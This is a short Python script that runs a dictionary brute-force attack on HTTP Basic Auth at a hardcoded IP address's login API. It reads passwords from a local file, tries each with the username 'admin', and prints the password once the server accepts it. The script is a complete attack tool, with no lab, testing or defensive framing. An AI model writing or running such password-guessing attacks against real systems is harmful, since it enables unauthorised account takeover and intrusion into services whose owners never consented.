import sys
import requests
from requests.auth import HTTPBasicAuth


def Brute_Force_Web(username, password):
    res = requests.get('http://222.30.45.190:8080/api/v1/login', auth=(username, password));
    if res.status_code == 200:
        print("Crack Sucess!");
        print("password:" + password);
        exit();
    else:
        print(res.status_code);


def GetPass():
    fp = open("password.txt", "r")
    if fp == 0:
        print("open file error!")
        return;
    while 1:
        line = fp.readline()
        if not line:
            break
        passwd = line.strip('\n')
        Brute_Force_Web("admin", passwd);


GetPass();